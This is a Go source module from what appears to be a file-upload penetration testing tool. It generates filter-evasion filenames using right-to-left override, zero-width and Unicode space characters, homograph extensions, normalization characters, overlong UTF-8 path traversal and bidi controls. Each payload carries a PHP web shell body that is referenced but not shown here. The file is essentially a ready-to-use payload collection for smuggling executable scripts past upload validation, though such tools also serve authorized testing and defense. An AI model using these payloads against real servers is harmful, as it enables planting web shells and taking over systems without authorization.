package payload

import (
	"fmt"
)

// moduleG generates Unicode, Special Character, and Encoding Attack payloads.
// Tests for Unicode normalization bypasses, homograph attacks, RTLO,
// zero-width characters, and other encoding-based filter evasion.
func moduleG() []*Payload {
	var tests []*Payload

	// G1: Right-to-Left Override (RTLO) attacks
	// Makes "php.exe" appear as "exe.php" in file explorers
	rtloTests := []struct {
		filename  string
		technique string
	}{
		{"test.\u202Ephp.exe", "RTLO: test.{RTLO}php.exe (appears as test.exe.php)"},
		{"image.\u202Ephp.png", "RTLO: image.{RTLO}php.png (appears as image.png.php)"},
		{"doc.\u202Ephar.pdf", "RTLO: doc.{RTLO}phar.pdf (appears as doc.pdf.phar)"},
		{"shell.\u202Ephtml.jpg", "RTLO: shell.{RTLO}phtml.jpg (appears as shell.jpg.phtml)"},
	}

	for _, rt := range rtloTests {
		tests = append(tests, &Payload{
			TestType:  TestTypeFilenameObfuscation,
			Technique: rt.technique,
			Filename:  rt.filename,
			Extension: ".php", // Actual extension after RTLO
			Body:      phpWebshell,
			Tags:      []string{"unicode", "rtlo", "right-to-left-override"},
		})
	}

	// G2: Zero-width characters (invisible characters in filenames)
	zeroWidthTests := []struct {
		char      rune
		charName  string
		technique string
	}{
		{'\u200B', "Zero-Width Space (ZWSP)", "ZWSP between name and extension"},
		{'\u200C', "Zero-Width Non-Joiner (ZWNJ)", "ZWNJ in filename"},
		{'\u200D', "Zero-Width Joiner (ZWJ)", "ZWJ in filename"},
		{'\uFEFF', "BOM (Byte Order Mark)", "BOM in filename"},
		{'\u2060', "Word Joiner", "Word Joiner in filename"},
		{'\u2061', "Function Application", "Invisible function char"},
		{'\u2062', "Invisible Times", "Invisible math char"},
		{'\u2063', "Invisible Separator", "Invisible separator"},
		{'\u2064', "Invisible Plus", "Invisible plus char"},
	}

	for _, zw := range zeroWidthTests {
		filename := fmt.Sprintf("test%c.php", zw.char)
		tests = append(tests, &Payload{
			TestType:  TestTypeFilenameObfuscation,
			Technique: fmt.Sprintf("Zero-width: %s in filename", zw.charName),
			Filename:  filename,
			Extension: ".php",
			Body:      phpWebshell,
			Tags:      []string{"unicode", "zero-width", zw.charName},
		})

		// Also test zero-width after extension
		filename2 := fmt.Sprintf("test.php%c.jpg", zw.char)
		tests = append(tests, &Payload{
			TestType:  TestTypeFilenameObfuscation,
			Technique: fmt.Sprintf("Zero-width after extension: %s", zw.charName),
			Filename:  filename2,
			Extension: ".jpg",
			Body:      phpWebshell,
			Tags:      []string{"unicode", "zero-width", "extension-hiding"},
		})
	}

	// G3: Homograph attacks (look-alike characters)
	homographTests := []struct {
		filename  string
		technique string
	}{
		{"test.рнр", "Cyrillic 'r,n,r' (U+0440,U+043D,U+0440) mimics .php"},
		{"test.рнр5", "Cyrillic .рнр5 extension"},
		{"test.рнtмl", "Mixed Cyrillic .рнtмl extension"},
		{"test.αspx", "Greek alpha in .aspx (αspx)"},
		{"test.αsp", "Greek alpha in .asp"},
		{"test.јsp", "Cyrillic ј in .jsp"},
	}

	for _, hg := range homographTests {
		tests = append(tests, &Payload{
			TestType:  TestTypeExtensionEvasion,
			Technique: hg.technique,
			Filename:  hg.filename,
			Extension: extractExtension(hg.filename),
			Body:      phpWebshell,
			Tags:      []string{"unicode", "homograph", "look-alike"},
		})
	}

	// G4: Unicode normalization attacks
	normalizationTests := []struct {
		filename  string
		technique string
	}{
		{"test.\u212A.php", "Kelvin sign (K) normalization test"},
		{"test.\u212A\u0131t.php", "Kelvin + dotless i normalization"},
		{"test.\u017F.php", "Long S normalization"},
		{"test.\uFB00.php", "ff ligature in extension"},
		{"test.\uFB01.php", "fi ligature in extension"},
		{"test.\uFB02.php", "fl ligature in extension"},
		{"test.\uFB03.php", "ffi ligature in extension"},
		{"test.\uFB04.php", "ffl ligature in extension"},
	}

	for _, nt := range normalizationTests {
		tests = append(tests, &Payload{
			TestType:  TestTypeFilenameObfuscation,
			Technique: nt.technique,
			Filename:  nt.filename,
			Extension: ".php",
			Body:      phpWebshell,
			Tags:      []string{"unicode", "normalization", "nfkc", "nfd"},
		})
	}

	// G5: Overlong UTF-8 encoding (path traversal via encoding)
	overlongTests := []struct {
		filename  string
		technique string
	}{
		{"%c0%ae%c0%ae/%c0%ae%c0%ae/test.php", "Overlong UTF-8 ../ sequence"},
		{"%c0%ae%c0%ae%c0%2ftest.php", "Overlong UTF-8 mixed encoding"},
		{"%e0%80%ae%e0%80%ae%e0%80%2ftest.php", "3-byte overlong UTF-8"},
		{"%f0%80%80%ae%f0%80%80%ae%f0%80%80%2ftest.php", "4-byte overlong UTF-8"},
	}

	for _, ot := range overlongTests {
		tests = append(tests, &Payload{
			TestType:  TestTypePathTraversal,
			Technique: ot.technique,
			Filename:  ot.filename,
			Extension: ".php",
			Body:      phpWebshell,
			Tags:      []string{"unicode", "overlong-utf8", "path-traversal", "encoding-bypass"},
		})
	}

	// G6: Unicode whitespace characters
	unicodeSpaces := []struct {
		char      rune
		charName  string
	}{
		{'\u00A0', "Non-breaking Space"},
		{'\u1680', "Ogham Space Mark"},
		{'\u180E', "Mongolian Vowel Separator"},
		{'\u2000', "En Quad"},
		{'\u2001', "Em Quad"},
		{'\u2002', "En Space"},
		{'\u2003', "Em Space"},
		{'\u2004', "Three-per-em Space"},
		{'\u2005', "Four-per-em Space"},
		{'\u2006', "Six-per-em Space"},
		{'\u2007', "Figure Space"},
		{'\u2008', "Punctuation Space"},
		{'\u2009', "Thin Space"},
		{'\u200A', "Hair Space"},
		{'\u202F', "Narrow No-break Space"},
		{'\u205F', "Medium Mathematical Space"},
		{'\u3000', "Ideographic Space"},
	}

	for _, us := range unicodeSpaces {
		// Space before extension
		filename1 := fmt.Sprintf("test%c.php", us.char)
		tests = append(tests, &Payload{
			TestType:  TestTypeFilenameObfuscation,
			Technique: fmt.Sprintf("Unicode whitespace: %s before extension", us.charName),
			Filename:  filename1,
			Extension: ".php",
			Body:      phpWebshell,
			Tags:      []string{"unicode", "whitespace", us.charName},
		})

		// Space after extension
		filename2 := fmt.Sprintf("test.php%c", us.char)
		tests = append(tests, &Payload{
			TestType:  TestTypeFilenameObfuscation,
			Technique: fmt.Sprintf("Unicode whitespace: %s after extension", us.charName),
			Filename:  filename2,
			Extension: ".php",
			Body:      phpWebshell,
			Tags:      []string{"unicode", "whitespace", "trailing"},
		})
	}

	// G7: Emoji in filenames
	emojiTests := []struct {
		emoji     string
		technique string
	}{
		{"🔥", "Fire emoji in filename"},
		{"💀", "Skull emoji in filename"},
		{"🚀", "Rocket emoji in filename"},
		{"⚠️", "Warning emoji in filename"},
		{"🎯", "Target emoji in filename"},
		{"👻", "Ghost emoji in filename"},
		{"😈", "Smiling devil emoji"},
	}

	for _, em := range emojiTests {
		filename := fmt.Sprintf("test%s.php", em.emoji)
		tests = append(tests, &Payload{
			TestType:  TestTypeFilenameObfuscation,
			Technique: em.technique,
			Filename:  filename,
			Extension: ".php",
			Body:      phpWebshell,
			Tags:      []string{"unicode", "emoji", "special-char"},
		})
	}

	// G8: Bidirectional text attacks
	bidiTests := []struct {
		filename  string
		technique string
	}{
		{"test.\u202A.php\u202C", "Left-to-Right Embedding (LRE)"},
		{"test.\u202B.php\u202C", "Right-to-Left Embedding (RLE)"},
		{"test.\u202D.php\u202C", "Left-to-Right Override (LRO)"},
		{"test.\u2066.php\u2069", "Left-to-Right Isolate (LRI)"},
		{"test.\u2067.php\u2069", "Right-to-Left Isolate (RLI)"},
		{"test.\u2068.php\u2069", "First Strong Isolate (FSI)"},
	}

	for _, bt := range bidiTests {
		tests = append(tests, &Payload{
			TestType:  TestTypeFilenameObfuscation,
			Technique: bt.technique,
			Filename:  bt.filename,
			Extension: ".php",
			Body:      phpWebshell,
			Tags:      []string{"unicode", "bidi", "bidirectional"},
		})
	}

	return tests
}
